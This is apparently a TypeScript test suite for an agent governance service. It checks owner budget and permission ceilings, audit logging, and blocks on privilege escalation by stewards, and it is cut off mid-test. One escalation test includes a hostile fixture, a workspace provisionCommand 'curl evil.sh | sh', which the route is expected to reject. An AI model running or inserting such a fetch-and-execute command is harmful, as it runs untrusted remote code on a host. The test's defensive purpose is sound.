import { randomUUID } from "node:crypto";
import express from "express";
import request from "supertest";
import { eq } from "drizzle-orm";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  activityLog,
  agentGovernancePolicies,
  agents,
  agentStewardships,
  companies,
  companyMemberships,
  createDb,
} from "@paperclipai/db";
import {
  AGENT_POLICY_UNLIMITED_BUDGET_CENTS,
  AGENT_POLICY_WILDCARD,
  DEFAULT_AGENT_GOVERNANCE_POLICY,
  agentGovernancePolicySchema,
  assertWithinCeiling,
  computeEffectiveAgentPolicy,
  type AgentGovernancePolicy,
} from "@paperclipai/shared";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { errorHandler } from "../middleware/index.js";
import { agentGovernanceRoutes } from "../routes/agent-governance.js";
import { agentGovernanceService } from "../services/agent-governance.js";
import { agentStewardshipService } from "../services/agent-stewardships.js";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

type TestDb = ReturnType<typeof createDb>;

const CEILING: AgentGovernancePolicy = {
  permissions: ["issues:read", "issues:write"],
  monthlyBudgetCents: 10_000,
  destructiveActions: "approval_required",
  dataScopes: ["project:alpha", "project:beta"],
  // Kept in canonical (sorted) order: persisted policies are normalized, so an
  // unsorted fixture would only ever test the normalizer, not the ceiling.
  providers: ["teams", "telegram"],
  minimumApproval: "steward",
};

const REQUESTED_TOO_BROAD: AgentGovernancePolicy = {
  permissions: ["issues:read", "secrets:read"],
  monthlyBudgetCents: 5_000,
  destructiveActions: "allowed",
  dataScopes: ["project:alpha"],
  providers: ["telegram"],
  minimumApproval: "none",
};

const REQUESTED_WITHIN: AgentGovernancePolicy = {
  permissions: ["issues:read"],
  monthlyBudgetCents: 5_000,
  destructiveActions: "blocked",
  dataScopes: ["project:alpha"],
  providers: ["telegram"],
  minimumApproval: "steward",
};

describe("agent governance policy intersection", () => {
  it("intersects requested authority with the owner ceiling", () => {
    expect(computeEffectiveAgentPolicy(CEILING, REQUESTED_TOO_BROAD)).toEqual({
      permissions: ["issues:read"],
      monthlyBudgetCents: 5_000,
      destructiveActions: "approval_required",
      dataScopes: ["project:alpha"],
      providers: ["telegram"],
      minimumApproval: "steward",
    });
  });

  it("rejects over-broad changes with a stable violation list", () => {
    expect(() => assertWithinCeiling(CEILING, REQUESTED_TOO_BROAD)).toThrow(
      expect.objectContaining({ code: "AGENT_POLICY_CEILING_EXCEEDED" }),
    );

    let violations: Array<{ field: string; code: string }> = [];
    try {
      assertWithinCeiling(CEILING, REQUESTED_TOO_BROAD);
    } catch (error) {
      violations = (error as { violations: Array<{ field: string; code: string }> }).violations;
    }

    expect(violations).toEqual([
      { field: "permissions", code: "PERMISSION_NOT_ALLOWED", requested: ["secrets:read"], allowed: CEILING.permissions, direction: "max" },
      { field: "destructiveActions", code: "DESTRUCTIVE_ACTIONS_EXCEED_CEILING", requested: "allowed", allowed: "approval_required", direction: "max" },
      { field: "minimumApproval", code: "MINIMUM_APPROVAL_BELOW_CEILING", requested: "none", allowed: "steward", direction: "min" },
    ]);
  });

  it("accepts a request that stays inside every ceiling dimension", () => {
    expect(() => assertWithinCeiling(CEILING, REQUESTED_WITHIN)).not.toThrow();
    expect(computeEffectiveAgentPolicy(CEILING, REQUESTED_WITHIN)).toEqual(REQUESTED_WITHIN);
  });

  it("flags a budget above the ceiling", () => {
    let violations: Array<{ field: string; code: string }> = [];
    try {
      assertWithinCeiling(CEILING, { ...REQUESTED_WITHIN, monthlyBudgetCents: 20_000 });
    } catch (error) {
      violations = (error as { violations: Array<{ field: string; code: string }> }).violations;
    }
    expect(violations).toEqual([
      { field: "monthlyBudgetCents", code: "BUDGET_EXCEEDS_CEILING", requested: 20_000, allowed: 10_000, direction: "max" },
    ]);
  });

  it("flags data scopes and providers outside the ceiling", () => {
    let violations: Array<{ field: string; code: string }> = [];
    try {
      assertWithinCeiling(CEILING, {
        ...REQUESTED_WITHIN,
        dataScopes: ["project:alpha", "project:secret"],
        providers: ["telegram", "slack"],
      });
    } catch (error) {
      violations = (error as { violations: Array<{ field: string; code: string }> }).violations;
    }
    expect(violations).toEqual([
      { field: "dataScopes", code: "DATA_SCOPE_NOT_ALLOWED", requested: ["project:secret"], allowed: CEILING.dataScopes, direction: "max" },
      { field: "providers", code: "PROVIDER_NOT_ALLOWED", requested: ["slack"], allowed: CEILING.providers, direction: "max" },
    ]);
  });

  it("is deterministic: sorted, deduplicated, and idempotent", () => {
    const noisyCeiling: AgentGovernancePolicy = {
      ...CEILING,
      permissions: ["issues:write", "issues:read", "issues:read"],
      dataScopes: ["project:beta", "project:alpha"],
      providers: ["teams", "telegram"],
    };
    const noisyRequest: AgentGovernancePolicy = {
      ...REQUESTED_WITHIN,
      permissions: ["issues:read", "issues:read"],
    };

    const first = computeEffectiveAgentPolicy(noisyCeiling, noisyRequest);
    const second = computeEffectiveAgentPolicy(noisyCeiling, noisyRequest);
    expect(first).toEqual(second);
    expect(first.permissions).toEqual(["issues:read"]);
    expect(computeEffectiveAgentPolicy(CEILING, first)).toEqual(first);
  });

  it("treats a wildcard ceiling as unrestricted and a wildcard request as ceiling-bound", () => {
    const wildcardCeiling: AgentGovernancePolicy = {
      ...CEILING,
      permissions: [AGENT_POLICY_WILDCARD],
      dataScopes: [AGENT_POLICY_WILDCARD],
      providers: [AGENT_POLICY_WILDCARD],
    };
    expect(() => assertWithinCeiling(wildcardCeiling, REQUESTED_TOO_BROAD)).toThrow();
    expect(
      computeEffectiveAgentPolicy(wildcardCeiling, { ...REQUESTED_WITHIN, permissions: ["anything:goes"] }).permissions,
    ).toEqual(["anything:goes"]);
    expect(computeEffectiveAgentPolicy(CEILING, { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] }).permissions)
      .toEqual(["issues:read", "issues:write"]);
  });

  it("keeps the default policy unrestricted on every enumerable dimension", () => {
    // Asserts the WHOLE default, not just the two permissive fields, so the
    // documented intent and the values cannot drift apart silently.
    expect(DEFAULT_AGENT_GOVERNANCE_POLICY).toEqual({
      permissions: [AGENT_POLICY_WILDCARD],
      monthlyBudgetCents: AGENT_POLICY_UNLIMITED_BUDGET_CENTS,
      destructiveActions: "approval_required",
      dataScopes: [AGENT_POLICY_WILDCARD],
      providers: [AGENT_POLICY_WILDCARD],
      minimumApproval: "steward",
    });
    expect(() => assertWithinCeiling(DEFAULT_AGENT_GOVERNANCE_POLICY, DEFAULT_AGENT_GOVERNANCE_POLICY)).not.toThrow();
    expect(computeEffectiveAgentPolicy(DEFAULT_AGENT_GOVERNANCE_POLICY, DEFAULT_AGENT_GOVERNANCE_POLICY))
      .toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
  });

  it("takes the stricter mode on both ordered dimensions, in both directions", () => {
    const permissive: AgentGovernancePolicy = {
      ...CEILING,
      destructiveActions: "allowed",
      minimumApproval: "none",
    };
    // Ceiling permissive, request strict -> request wins (it is stricter).
    expect(computeEffectiveAgentPolicy(permissive, { ...REQUESTED_WITHIN, destructiveActions: "blocked" }).destructiveActions)
      .toBe("blocked");
    expect(computeEffectiveAgentPolicy(permissive, { ...REQUESTED_WITHIN, minimumApproval: "steward" }).minimumApproval)
      .toBe("steward");
    // A request stricter than a permissive ceiling is never a violation.
    expect(() => assertWithinCeiling(permissive, { ...REQUESTED_WITHIN, minimumApproval: "steward" })).not.toThrow();
    expect(() => assertWithinCeiling(permissive, { ...REQUESTED_WITHIN, destructiveActions: "blocked" })).not.toThrow();
  });

  it("treats an empty ceiling list as deny-all consistently in compute and assert", () => {
    const denyAll: AgentGovernancePolicy = { ...CEILING, permissions: [] };
    expect(computeEffectiveAgentPolicy(denyAll, REQUESTED_WITHIN).permissions).toEqual([]);
    expect(() => assertWithinCeiling(denyAll, REQUESTED_WITHIN)).toThrow();
    // A wildcard request against a deny-all ceiling asks for "whatever is
    // allowed", which is nothing — allowed, but it grants nothing.
    expect(computeEffectiveAgentPolicy(denyAll, { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] }).permissions)
      .toEqual([]);
    expect(() => assertWithinCeiling(denyAll, { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] })).not.toThrow();
  });

  it("never yields an effective policy broader than the ceiling", () => {
    const ceilings: AgentGovernancePolicy[] = [
      CEILING,
      { ...CEILING, permissions: [] },
      { ...CEILING, permissions: [AGENT_POLICY_WILDCARD] },
      DEFAULT_AGENT_GOVERNANCE_POLICY,
    ];
    const requests: AgentGovernancePolicy[] = [
      REQUESTED_WITHIN,
      REQUESTED_TOO_BROAD,
      { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] },
      { ...REQUESTED_WITHIN, permissions: [] },
      DEFAULT_AGENT_GOVERNANCE_POLICY,
    ];

    for (const ceiling of ceilings) {
      for (const requestedPolicy of requests) {
        const effective = computeEffectiveAgentPolicy(ceiling, requestedPolicy);
        // The clamped result must itself always be acceptable to the ceiling.
        expect(
          () => assertWithinCeiling(ceiling, effective),
          `effective exceeded ceiling for ${JSON.stringify({ ceiling, requestedPolicy })}`,
        ).not.toThrow();
        expect(effective.monthlyBudgetCents).toBeLessThanOrEqual(ceiling.monthlyBudgetCents);
        if (!ceiling.permissions.includes(AGENT_POLICY_WILDCARD)) {
          for (const permission of effective.permissions) {
            expect(ceiling.permissions).toContain(permission);
          }
        }
      }
    }
  });

  it("rejects a wildcard mixed with concrete entries at the validator", () => {
    // Normalization collapses ["a","*"] to ["*"], which would silently widen a
    // steward request to the entire ceiling, so the edge must refuse it.
    const mixed = agentGovernancePolicySchema.safeParse({
      ...REQUESTED_WITHIN,
      permissions: ["issues:read", AGENT_POLICY_WILDCARD],
    });
    expect(mixed.success).toBe(false);

    expect(agentGovernancePolicySchema.safeParse(REQUESTED_WITHIN).success).toBe(true);
    expect(
      agentGovernancePolicySchema.safeParse({ ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] }).success,
    ).toBe(true);
  });

  it("marks minimumApproval as a floor and the other dimensions as maxima", () => {
    let violations: Array<{ field: string; direction: string }> = [];
    try {
      assertWithinCeiling(CEILING, REQUESTED_TOO_BROAD);
    } catch (error) {
      violations = (error as { violations: Array<{ field: string; direction: string }> }).violations;
    }
    const byField = Object.fromEntries(violations.map((v) => [v.field, v.direction]));
    expect(byField.permissions).toBe("max");
    expect(byField.destructiveActions).toBe("max");
    expect(byField.minimumApproval).toBe("min");
  });
});

async function createCompany(db: TestDb, productProfile: "default" | "agentdash_mk" = "agentdash_mk") {
  return db
    .insert(companies)
    .values({
      name: `Governance ${randomUUID()}`,
      issuePrefix: `GV${randomUUID().slice(0, 6).toUpperCase()}`,
      productProfile,
    })
    .returning()
    .then((rows) => rows[0]!);
}

async function createMember(
  db: TestDb,
  companyId: string,
  input: { userId?: string; status?: string; role?: string | null } = {},
) {
  const userId = input.userId ?? randomUUID();
  return db
    .insert(companyMemberships)
    .values({
      companyId,
      principalType: "user",
      principalId: userId,
      status: input.status ?? "active",
      membershipRole: input.role ?? "operator",
    })
    .returning()
    .then((rows) => rows[0]!);
}

async function createAgent(db: TestDb, companyId: string, name = "Agent") {
  return db
    .insert(agents)
    .values({
      companyId,
      name: `${name} ${randomUUID()}`,
      role: "engineer",
      status: "idle",
      adapterType: "process",
    })
    .returning()
    .then((rows) => rows[0]!);
}

function makeBoardActor(companyId: string, userId: string, role = "owner") {
  return {
    type: "board",
    userId,
    source: "session",
    isInstanceAdmin: false,
    companyIds: [companyId],
    memberships: [{ companyId, membershipRole: role, status: "active" }],
  };
}

async function createApp(db: TestDb, actor: Record<string, unknown>) {
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    (req as any).actor = {
      ...actor,
      companyIds: Array.isArray(actor.companyIds) ? [...actor.companyIds] : actor.companyIds,
    };
    next();
  });
  app.use("/api", agentGovernanceRoutes(db));
  app.use(errorHandler);
  return app;
}

async function requestApp(app: express.Express, buildRequest: (baseUrl: string) => request.Test) {
  const { createServer } = await import("node:http");
  const server = createServer(app);
  try {
    await new Promise<void>((resolve) => {
      server.listen(0, "127.0.0.1", resolve);
    });
    const address = server.address();
    if (!address || typeof address === "string") {
      throw new Error("Expected HTTP server to listen on a TCP port");
    }
    return await buildRequest(`http://127.0.0.1:${address.port}`);
  } finally {
    if (server.listening) {
      await new Promise<void>((resolve, reject) => {
        server.close((error) => (error ? reject(error) : resolve()));
      });
    }
  }
}

describeEmbeddedPostgres("agent governance service and routes", () => {
  let db!: TestDb;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-agent-governance-");
    db = createDb(tempDb.connectionString);
  }, 20_000);

  afterEach(async () => {
    await db.delete(activityLog);
    await db.delete(agentGovernancePolicies);
    await db.delete(agentStewardships);
    await db.delete(agents);
    await db.delete(companyMemberships);
    await db.delete(companies);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function seed(productProfile: "default" | "agentdash_mk" = "agentdash_mk") {
    const company = await createCompany(db, productProfile);
    const owner = await createMember(db, company.id, { role: "owner" });
    const steward = await createMember(db, company.id, { role: "operator" });
    const bystander = await createMember(db, company.id, { role: "operator" });
    const agent = await createAgent(db, company.id);
    await agentStewardshipService(db).assign(company.id, {
      agentId: agent.id,
      userId: steward.principalId,
      assignedByUserId: owner.principalId,
    });
    return { company, owner, steward, bystander, agent };
  }

  it("lazily materializes an unrestricted default policy for an agent", async () => {
    const { company, agent } = await seed();
    const policy = await agentGovernanceService(db).getForAgent(company.id, agent.id);

    expect(policy.ownerCeiling).toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
    expect(policy.stewardRequest).toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
    expect(policy.effectivePolicy).toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
    expect(policy.revision).toBe(1);
  });

  it("recomputes the effective policy when the owner lowers the ceiling", async () => {
    const { company, owner, agent } = await seed();
    const svc = agentGovernanceService(db);
    const current = await svc.getForAgent(company.id, agent.id);

    const updated = await svc.updateOwnerCeiling(company.id, agent.id, {
      policy: CEILING,
      revision: current.revision,
      actorUserId: owner.principalId,
      channel: "web",
    });

    expect(updated.ownerCeiling).toEqual(CEILING);
    expect(updated.effectivePolicy).toEqual(CEILING);
    expect(updated.revision).toBe(current.revision + 1);

    const accepted = await db
      .select()
      .from(activityLog)
      .where(eq(activityLog.action, "agent.governance_ceiling_updated"))
      .then((rows) => rows[0]!);
    expect(accepted.actorId).toBe(owner.principalId);
    expect(accepted.details).toMatchObject({
      fromRevision: current.revision,
      toRevision: updated.revision,
      channel: "web",
      result: "accepted",
    });
  });

  it("clamps an accepted steward request to the ceiling and records provenance", async () => {
    const { company, owner, steward, agent } = await seed();
    const svc = agentGovernanceService(db);
    const withCeiling = await svc.updateOwnerCeiling(company.id, agent.id, {
      policy: CEILING,
      revision: (await svc.getForAgent(company.id, agent.id)).revision,
      actorUserId: owner.principalId,
      channel: "web",
    });

    const updated = await svc.updateStewardRequest(company.id, agent.id, {
      policy: REQUESTED_WITHIN,
      revision: withCeiling.revision,
      actorUserId: steward.principalId,
      channel: "web",
    });

    expect(updated.stewardRequest).toEqual(REQUESTED_WITHIN);
    expect(updated.effectivePolicy).toEqual(REQUESTED_WITHIN);
    expect(updated.ownerCeiling).toEqual(CEILING);

    const accepted = await db
      .select()
      .from(activityLog)
      .where(eq(activityLog.action, "agent.governance_request_updated"))
      .then((rows) => rows[0]!);
    expect(accepted.actorId).toBe(steward.principalId);
  });

  it("durably audits a rejected steward request without persisting the rejected policy", async () => {
    const { company, owner, steward, agent } = await seed();
    const svc = agentGovernanceService(db);
    const withCeiling = await svc.updateOwnerCeiling(company.id, agent.id, {
      policy: CEILING,
      revision: (await svc.getForAgent(company.id, agent.id)).revision,
      actorUserId: owner.principalId,
      channel: "web",
    });

    await expect(
      svc.updateStewardRequest(company.id, agent.id, {
        policy: REQUESTED_TOO_BROAD,
        revision: withCeiling.revision,
        actorUserId: steward.principalId,
        channel: "telegram",
      }),
    ).rejects.toMatchObject({ status: 422, code: "AGENT_POLICY_CEILING_EXCEEDED" });

    const unchanged = await svc.getForAgent(company.id, agent.id);
    expect(unchanged.stewardRequest).toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
    expect(unchanged.revision).toBe(withCeiling.revision);

    const rejected = await db
      .select()
      .from(activityLog)
      .where(eq(activityLog.action, "agent.governance_change_rejected"))
      .then((rows) => rows[0]!);
    expect(rejected.actorId).toBe(steward.principalId);
    expect(rejected.details).toMatchObject({
      result: "rejected",
      code: "AGENT_POLICY_CEILING_EXCEEDED",
      channel: "telegram",
      target: "steward_request",
      fromRevision: withCeiling.revision,
    });
    expect((rejected.details as { violations: unknown[] }).violations).toHaveLength(3);
  });

  it("rejects a stale revision with 409 and audits the conflict", async () => {
    const { company, owner, agent } = await seed();
    const svc = agentGovernanceService(db);
    const first = await svc.getForAgent(company.id, agent.id);
    await svc.updateOwnerCeiling(company.id, agent.id, {
      policy: CEILING,
      revision: first.revision,
      actorUserId: owner.principalId,
      channel: "web",
    });

    await expect(
      svc.updateOwnerCeiling(company.id, agent.id, {
        policy: { ...CEILING, monthlyBudgetCents: 1_000 },
        revision: first.revision,
        actorUserId: owner.principalId,
        channel: "web",
      }),
    ).rejects.toMatchObject({ status: 409, code: "AGENT_POLICY_REVISION_CONFLICT" });

    const conflict = await db
      .select()
      .from(activityLog)
      .where(eq(activityLog.action, "agent.governance_change_rejected"))
      .then((rows) => rows[0]!);
    expect(conflict.details).toMatchObject({
      result: "rejected",
      code: "AGENT_POLICY_REVISION_CONFLICT",
      target: "owner_ceiling",
    });
  });

  it("isolates policies by company", async () => {
    const first = await seed();
    const second = await seed();
    const svc = agentGovernanceService(db);

    await svc.updateOwnerCeiling(first.company.id, first.agent.id, {
      policy: CEILING,
      revision: (await svc.getForAgent(first.company.id, first.agent.id)).revision,
      actorUserId: first.owner.principalId,
      channel: "web",
    });

    await expect(
      svc.updateOwnerCeiling(first.company.id, second.agent.id, {
        policy: CEILING,
        revision: 1,
        actorUserId: first.owner.principalId,
        channel: "web",
      }),
    ).rejects.toMatchObject({ status: 404 });

    expect((await svc.getForAgent(second.company.id, second.agent.id)).ownerCeiling)
      .toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
  });

  it("returns 404 on every governance route for a non-agentdash_mk company", async () => {
    const { company, owner, agent } = await seed("default");
    const app = await createApp(db, makeBoardActor(company.id, owner.principalId, "owner"));

    const read = await requestApp(app, (baseUrl) =>
      request(baseUrl).get(`/api/companies/${company.id}/agents/${agent.id}/governance`),
    );
    expect(read.status).toBe(404);

    const write = await requestApp(app, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/ceiling`)
        .send({ policy: CEILING, revision: 1 }),
    );
    expect(write.status).toBe(404);
  });

  it("lets an owner set the ceiling and denies the steward that authority", async () => {
    const { company, owner, steward, agent } = await seed();

    const ownerApp = await createApp(db, makeBoardActor(company.id, owner.principalId, "owner"));
    const ownerRes = await requestApp(ownerApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/ceiling`)
        .send({ policy: CEILING, revision: 1 }),
    );
    expect(ownerRes.status).toBe(200);
    expect(ownerRes.body.policy.ownerCeiling).toMatchObject({ monthlyBudgetCents: 10_000 });

    const stewardApp = await createApp(db, makeBoardActor(company.id, steward.principalId, "operator"));
    const stewardRes = await requestApp(stewardApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/ceiling`)
        .send({ policy: CEILING, revision: 2 }),
    );
    expect(stewardRes.status).toBe(403);
  });

  it("lets the current steward set the request and denies an unrelated member", async () => {
    const { company, steward, bystander, agent } = await seed();

    const stewardApp = await createApp(db, makeBoardActor(company.id, steward.principalId, "operator"));
    const stewardRes = await requestApp(stewardApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/request`)
        .send({ policy: REQUESTED_WITHIN, revision: 1 }),
    );
    expect(stewardRes.status).toBe(200);
    expect(stewardRes.body.policy.effectivePolicy).toMatchObject({ monthlyBudgetCents: 5_000 });

    const bystanderApp = await createApp(db, makeBoardActor(company.id, bystander.principalId, "operator"));
    const bystanderRes = await requestApp(bystanderApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/request`)
        .send({ policy: REQUESTED_WITHIN, revision: 2 }),
    );
    expect(bystanderRes.status).toBe(403);
  });

  it("surfaces ceiling violations as 422 with stable codes over HTTP", async () => {
    const { company, owner, steward, agent } = await seed();
    const ownerApp = await createApp(db, makeBoardActor(company.id, owner.principalId, "owner"));
    await requestApp(ownerApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/ceiling`)
        .send({ policy: CEILING, revision: 1 }),
    );

    const stewardApp = await createApp(db, makeBoardActor(company.id, steward.principalId, "operator"));
    const res = await requestApp(stewardApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/request`)
        .send({ policy: REQUESTED_TOO_BROAD, revision: 2 }),
    );

    expect(res.status).toBe(422);
    expect(res.body.details.code).toBe("AGENT_POLICY_CEILING_EXCEEDED");
    expect(res.body.details.violations.map((v: { code: string }) => v.code)).toEqual([
      "PERMISSION_NOT_ALLOWED",
      "DESTRUCTIVE_ACTIONS_EXCEED_CEILING",
      "MINIMUM_APPROVAL_BELOW_CEILING",
    ]);
  });

  it("rejects agent-authenticated callers and unknown payload keys", async () => {
    const { company, owner, agent } = await seed();

    const agentApp = await createApp(db, { type: "agent", companyId: company.id, agentId: agent.id });
    const agentRes = await requestApp(agentApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/ceiling`)
        .send({ policy: CEILING, revision: 1 }),
    );
    expect(agentRes.status).toBe(403);

    const ownerApp = await createApp(db, makeBoardActor(company.id, owner.principalId, "owner"));
    const strictRes = await requestApp(ownerApp, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/agents/${agent.id}/governance/ceiling`)
        .send({ policy: CEILING, revision: 1, unexpected: true }),
    );
    expect(strictRes.status).toBe(400);
  });

  it("enforces the effective ceiling at the service boundary for agent mutations", async () => {
    const { company, owner, agent } = await seed();
    const svc = agentGovernanceService(db);
    await svc.updateOwnerCeiling(company.id, agent.id, {
      policy: CEILING,
      revision: (await svc.getForAgent(company.id, agent.id)).revision,
      actorUserId: owner.principalId,
      channel: "web",
    });

    await expect(
      svc.assertAgentMutationWithinCeiling(company.id, agent.id, { monthlyBudgetCents: 50_000 }),
    ).rejects.toMatchObject({ status: 422, code: "AGENT_POLICY_CEILING_EXCEEDED" });

    await expect(
      svc.assertAgentMutationWithinCeiling(company.id, agent.id, { monthlyBudgetCents: 4_000 }),
    ).resolves.toBeUndefined();
  });

  it("skips ceiling enforcement for default-profile companies", async () => {
    const { company, agent } = await seed("default");
    await expect(
      agentGovernanceService(db).assertAgentMutationWithinCeiling(company.id, agent.id, {
        monthlyBudgetCents: 10_000_000,
      }),
    ).resolves.toBeUndefined();
  });

  describe("agent configuration authority on existing agent routes", () => {
    async function createAgentApp(actor: Record<string, unknown>) {
      const { agentRoutes } = await import("../routes/agents.js");
      const app = express();
      app.use(express.json());
      app.use((req, _res, next) => {
        (req as any).actor = {
          ...actor,
          companyIds: Array.isArray(actor.companyIds) ? [...actor.companyIds] : actor.companyIds,
        };
        next();
      });
      app.use("/api", agentRoutes(db));
      app.use(errorHandler);
      return app;
    }

    it("lets the current steward configure their own agent", async () => {
      const { company, steward, agent } = await seed();
      // `operator` deliberately lacks agents:create — authority here comes from
      // stewardship alone, which is the behavior under test.
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ title: "Head of Marketing" }),
      );

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect(res.body.title).toBe("Head of Marketing");
    });

    it("denies a company member who is not the steward of that agent", async () => {
      const { company, bystander, agent } = await seed();
      const app = await createAgentApp(makeBoardActor(company.id, bystander.principalId, "operator"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ title: "Hijacked" }),
      );

      expect(res.status).toBe(403);
    });

    it("does not let stewardship widen into company-wide agent administration", async () => {
      const { company, steward } = await seed();
      const otherAgent = await createAgent(db, company.id, "Unstewarded");
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${otherAgent.id}`).send({ title: "Not mine" }),
      );

      expect(res.status).toBe(403);
    });

    it("enforces the owner budget ceiling before persisting an agent budget change", async () => {
      const { company, owner, steward, agent } = await seed();
      const svc = agentGovernanceService(db);
      await svc.updateOwnerCeiling(company.id, agent.id, {
        policy: CEILING,
        revision: (await svc.getForAgent(company.id, agent.id)).revision,
        actorUserId: owner.principalId,
        channel: "web",
      });
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      const rejected = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ budgetMonthlyCents: 90_000 }),
      );
      expect(rejected.status).toBe(422);
      expect(rejected.body.details.code).toBe("AGENT_POLICY_CEILING_EXCEEDED");

      const accepted = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ budgetMonthlyCents: 9_000 }),
      );
      expect(accepted.status, JSON.stringify(accepted.body)).toBe(200);
      expect(accepted.body.budgetMonthlyCents).toBe(9_000);
    });

    // These are the escalation paths: a steward is an ordinary operator, so any
    // field that can be turned into broader authority must stay admin-only.
    it("refuses to let a steward promote their agent to a privileged role", async () => {
      const { company, steward, agent } = await seed();
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ role: "ceo" }),
      );

      expect(res.status).toBe(403);
      const unchanged = await db
        .select()
        .from(agents)
        .where(eq(agents.id, agent.id))
        .then((rows) => rows[0]!);
      expect(unchanged.role).toBe("engineer");
    });

    it("refuses steward writes to host-executed workspace commands and other ungoverned fields", async () => {
      const { company, steward, agent } = await seed();
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      for (const body of [
        { adapterConfig: { workspaceStrategy: { provisionCommand: "curl evil.sh | sh" } } },
        { adapterType: "http" },
        { runtimeConfig: { anything: true } },
        { spentMonthlyCents: 0 },
        { status: "active" },
        { reportsTo: null },
      ]) {
        const res = await requestApp(app, (baseUrl) =>
          request(baseUrl).patch(`/api/agents/${agent.id}`).send(body),
        );
        expect(res.status, `expected 403 for ${JSON.stringify(body)}`).toBe(403);
      }
    });

    it("refuses steward-initiated configuration rollback", async () => {
      const { company, steward, agent } = await seed();
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).post(`/api/agents/${agent.id}/config-revisions/${randomUUID()}/rollback`).send({}),
      );

      expect(res.status).toBe(403);
    });

    it("validates the permissions that will actually be written, not just the request body", async () => {
      const { company, owner, steward, agent } = await seed();
      const svc = agentGovernanceService(db);
      // Ceiling deliberately withholds tasks:assign.
      await svc.updateOwnerCeiling(company.id, agent.id, {
        policy: { ...CEILING, permissions: ["agents:create"] },
        revision: (await svc.getForAgent(company.id, agent.id)).revision,
        actorUserId: owner.principalId,
        channel: "web",
      });
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      // canAssignTasks is false, but the route derives it as true from
      // canCreateAgents — the ceiling must see the derived value.
      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl)
          .patch(`/api/agents/${agent.id}/permissions`)
          .send({ canCreateAgents: true, canAssignTasks: false }),
      );

      expect(res.status).toBe(422);
      expect(res.body.details.violations.map((v: { code: string }) => v.code)).toContain(
        "PERMISSION_NOT_ALLOWED",
      );
    });

    it("audits a ceiling rejection raised from the agent configuration routes", async () => {
      const { company, owner, steward, agent } = await seed();
      const svc = agentGovernanceService(db);
      await svc.updateOwnerCeiling(company.id, agent.id, {
        policy: CEILING,
        revision: (await svc.getForAgent(company.id, agent.id)).revision,
        actorUserId: owner.principalId,
        channel: "web",
      });
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ budgetMonthlyCents: 90_000 }),
      );

      const rejected = await db
        .select()
        .from(activityLog)
        .where(eq(activityLog.action, "agent.governance_change_rejected"))
        .then((rows) => rows[0]!);
      expect(rejected).toBeDefined();
      expect(rejected.actorId).toBe(steward.principalId);
      expect(rejected.details).toMatchObject({ code: "AGENT_POLICY_CEILING_EXCEEDED" });
    });

    it("clamps an already-configured agent when the owner lowers the ceiling beneath it", async () => {
      const { company, owner, agent } = await seed();
      const svc = agentGovernanceService(db);
      await db
        .update(agents)
        .set({ budgetMonthlyCents: 90_000 })
        .where(eq(agents.id, agent.id));

      await svc.updateOwnerCeiling(company.id, agent.id, {
        policy: CEILING, // monthlyBudgetCents: 10_000
        revision: (await svc.getForAgent(company.id, agent.id)).revision,
        actorUserId: owner.principalId,
        channel: "web",
      });

      const clamped = await db
        .select()
        .from(agents)
